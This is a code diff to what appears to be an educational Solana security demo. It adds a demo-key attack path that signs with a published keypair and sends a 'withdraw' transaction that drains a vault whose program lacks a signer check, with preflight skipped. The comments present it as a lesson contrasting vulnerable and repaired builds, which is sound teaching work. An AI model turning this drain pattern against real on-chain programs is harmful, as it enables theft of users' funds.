@@ -10,10 +10,11 @@
  */
 
 import { Buffer } from 'buffer';
-import { Connection, PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
+import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
 import type { AttackPorts } from './chainRun';
 import { withdrawAccounts, withdrawInstructionData, type VaultReader } from './devnet';
 import type { SolanaProvider } from './wallet';
+import { demoSigner } from '../config/demoSigner';
 
 /** Only the three RPC calls the attack needs; a real `Connection` satisfies it. */
 export type AttackConnection = Pick<
@@ -23,6 +24,55 @@ export type AttackConnection = Pick<
 
 /** Only the one call reading a vault needs. */
 export type AccountConnection = Pick<Connection, 'getAccountInfo'>;
+
+/**
+ * The one instruction both ports send.
+ *
+ * Kept here so the wallet path and the demo-key path cannot drift apart: a
+ * second copy of the account list or of the amount encoding is exactly where the
+ * two would quietly disagree about what the attack *is*.
+ */
+function withdrawInstruction(
+  programId: PublicKey,
+  input: { vault: string; authority: string; amount: number },
+): TransactionInstruction {
+  return new TransactionInstruction({
+    programId,
+    keys: withdrawAccounts(new PublicKey(input.vault), new PublicKey(input.authority)),
+    // web3.js types this field as `buffer`'s `Buffer` — a nominal class with 66
+    // methods a plain `Uint8Array` does not have. The conversion belongs here
+    // rather than in `devnet.ts`, which stays free of the `buffer` dependency
+    // and therefore of any need for a polyfill.
+    data: Buffer.from(withdrawInstructionData(input.amount)),
+  });
+}
+
+/** A recent blockhash for the transaction message. Shared by both ports. */
+function latestBlockhashPort(connection: AttackConnection): AttackPorts['latestBlockhash'] {
+  return async () => {
+    const { blockhash } = await connection.getLatestBlockhash();
+    return blockhash;
+  };
+}
+
+/**
+ * The RPC status of a submitted signature, mapped to what `chainRun.ts` expects.
+ * Shared by both ports — pending stays pending, and only a settled status is a
+ * verdict.
+ */
+function signatureStatusPort(connection: AttackConnection): AttackPorts['signatureStatus'] {
+  return async (signature) => {
+    const { value } = await connection.getSignatureStatuses([signature]);
+    const status = value?.[0];
+    if (!status) return null;
+
+    // A status the cluster has seen but not yet confirmed is still pending;
+    // reporting it as a verdict would turn a race into a result.
+    const settled =
+      status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized';
+    return settled ? { err: status.err ?? null } : null;
+  };
+}
 
 /**
  * The program id is a parameter rather than a module import so the adapter never
@@ -41,10 +91,7 @@ export function attackPorts(
   };
 
   return {
-    latestBlockhash: async () => {
-      const { blockhash } = await connection.getLatestBlockhash();
-      return blockhash;
-    },
+    latestBlockhash: latestBlockhashPort(connection),
 
     sendWithdraw: async (input) => {
       const transaction = new Transaction({
@@ -52,17 +99,7 @@ export function attackPorts(
         recentBlockhash: input.blockhash,
       });
 
-      transaction.add(
-        new TransactionInstruction({
-          programId,
-          keys: withdrawAccounts(new PublicKey(input.vault), new PublicKey(input.authority)),
-          // web3.js types this field as `buffer`'s `Buffer` — a nominal class
-          // with 66 methods a plain `Uint8Array` does not have. The conversion
-          // belongs here rather than in `devnet.ts`, which stays free of the
-          // `buffer` dependency and therefore of any need for a polyfill.
-          data: Buffer.from(withdrawInstructionData(input.amount)),
-        }),
-      );
+      transaction.add(withdrawInstruction(programId, input));
 
       const signed = await provider.signTransaction(transaction);
 
@@ -74,17 +111,49 @@ export function attackPorts(
       return connection.sendRawTransaction(signed.serialize(), { skipPreflight: true });
     },
 
-    signatureStatus: async (signature) => {
-      const { value } = await connection.getSignatureStatuses([signature]);
-      const status = value?.[0];
-      if (!status) return null;
+    signatureStatus: signatureStatusPort(connection),
+  };
+}
 
-      // A status the cluster has seen but not yet confirmed is still pending;
-      // reporting it as a verdict would turn a race into a result.
-      const settled =
-        status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized';
-      return settled ? { err: status.err ?? null } : null;
+/**
+ * The demo-key attack port — the same transaction, signed here instead of by a
+ * wallet.
+ *
+ * This is what makes Execute real for a visitor with no wallet: the published
+ * demo keypair (`config/demoSigner.ts`) is the fee payer and the only signer, and
+ * the transaction goes straight to the RPC. The `authority` account is still the
+ * ADMIN public key — nobody signs as the admin, which is the whole point of the
+ * lesson: `withdraw` declares no signer, so a transaction that never held the
+ * admin's secret still drains the vault.
+ *
+ * Identical to `attackPorts` in every other respect — same instruction, same
+ * `skipPreflight` reasoning, same status mapping. The only difference is who
+ * holds the signature.
+ */
+export function demoAttackPorts(
+  connection: AttackConnection,
+  programId: PublicKey,
+  signer: Keypair = demoSigner(),
+): AttackPorts {
+  return {
+    latestBlockhash: latestBlockhashPort(connection),
+
+    sendWithdraw: async (input) => {
+      const transaction = new Transaction({
+        feePayer: signer.publicKey,
+        recentBlockhash: input.blockhash,
+      });
+
+      transaction.add(withdrawInstruction(programId, input));
+      transaction.sign(signer);
+
+      // Same reasoning as `attackPorts`: with preflight on, the repaired build's
+      // transaction is rejected by simulation and never lands, so there is no
+      // signature to point at — and the failed transaction is the evidence.
+      return connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true });
     },
+
+    signatureStatus: signatureStatusPort(connection),
   };
 }
 
